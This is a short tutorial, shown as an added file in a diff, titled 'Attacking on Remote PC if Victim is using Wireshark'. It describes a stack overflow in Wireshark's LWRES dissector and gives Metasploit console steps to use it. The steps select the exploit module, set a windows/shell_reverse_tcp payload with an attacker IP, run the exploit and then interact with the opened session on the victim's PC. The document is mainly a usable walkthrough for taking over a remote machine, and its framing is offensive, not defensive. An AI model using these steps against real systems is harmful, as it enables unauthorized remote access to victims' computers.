@@ -1,0 +1,22 @@
+
+Attacking on Remote PC if Victim is using Wireshark
+
+The LWRES dissector in Wireshark version 0.9.15 through 1.0.10 and 1.2.0 through 1.2.5 allows remote attackers to execute arbitrary code due to a stack-based buffer overflow. This bug found and reported by babi. This particular exploit targets the dissect_getaddrsbyname_request function. Several other functions also contain potentially exploitable stack-based buffer overflows. The Windows version (of 1.2.5 at least) is compiled with /GS, which prevents exploitation via the return address on the stack. Sending a larger string allows exploitation using the SEH bypass method. However, this packet will usually get fragmented, which may cause additional complications. NOTE: The vulnerable code is reached only when the packet dissection is rendered. If the packet is fragmented, all fragments must be captured and reassembled to exploit this issue.
+0 – tshark 1.0.2-3+lenny7 on Debian 5.0.3 (x86)
+1 – wireshark 1.0.2-3+lenny7 on Debian 5.0.3 (x86)
+2 – wireshark 1.2.5 on RHEL 5.4 (x64)
+3 – wireshark 1.2.5 on Mac OS X 10.5 (x86)
+4 – wireshark/tshark 1.2.1 and 1.2.5 on Windows (x86)
+Attacker: Backtrack 5
+Victim PC: Windows XP
+Open backtrack terminal type msfconsole
+
+Now type use exploit/multi/misc/wireshark_lwres_getaddrbyname_loop
+Msf exploit (wireshark_lwres_getaddrbyname_loop)>set payload windows/shell_reverse_tcp
+Msf exploit (wireshark_lwres_getaddrbyname_loop)>set lhost 192.168.1.2 (IP of Local Host)
+Msf exploit (wireshark_lwres_getaddrbyname_loop)>exploit
+
+Before running the exploit command, let say that the attacker now still collecting data using their Wireshark tool like the picture below.
+
+Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“
+ 
